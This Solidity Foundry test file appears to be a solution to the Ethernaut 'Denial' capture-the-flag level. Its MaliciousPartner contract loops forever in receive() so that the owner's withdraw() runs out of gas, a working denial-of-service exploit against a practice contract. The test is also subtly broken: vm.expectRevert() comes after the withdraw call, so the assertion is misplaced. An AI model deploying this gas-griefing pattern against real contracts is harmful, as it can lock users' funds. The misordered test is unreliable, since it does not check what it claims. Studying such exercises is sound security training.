// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Denial} from "../../src/Week8-9/Ethernaut_Denial.sol";

/**
 * This is a simple wallet that drips funds over time. You can withdraw the funds slowly
 * by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when
 * they call withdraw() (whilst the contract still has funds, and the transaction is of
 * 1M gas or less) you will win this level.
 */

//forge test --match-contract DenialTest -vvvv
contract DenialTest is Test {
    Denial denial;
    MaliciousPartner partner;

    function setUp() public {
        denial = new Denial();
        partner = new MaliciousPartner();
        vm.deal(address(denial), 1_000 ether);
        denial.setWithdrawPartner(address(partner));
    }

    function testExploit() public {
        denial.withdraw();
        vm.expectRevert();
    }
}

contract MaliciousPartner {
    uint256 public random;

    receive() external payable {
        while (true) {
            random++;
        }
    }
}
